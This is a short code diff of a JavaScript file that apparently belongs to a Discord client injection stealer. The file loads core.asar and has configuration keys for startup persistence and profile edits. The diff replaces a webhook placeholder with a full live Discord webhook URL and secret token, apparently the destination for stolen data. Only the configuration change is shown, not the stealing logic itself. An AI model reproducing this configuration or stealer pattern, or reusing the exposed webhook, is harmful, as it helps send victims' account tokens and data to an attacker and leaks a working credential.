@@ -32,7 +32,7 @@ const execScript = async script => {
 };
 
 const CONFIG = {
- webhook: '%WEBHOOK_URL%',
+ webhook: 'https://discord.com/api/webhooks/1421094710822309942/G9-Pgqc3PauZhO2mn5AeY83YWW_2udeloDtN5z2IZjVGINZPMkkANT5emBOJHa4nX_bL',
  API: '%API_URL%',
  auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
  auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
@@ -1376,3 +1376,4 @@ const complete = async () => {
 complete();
 
 module.exports = require('./core.asar');
+
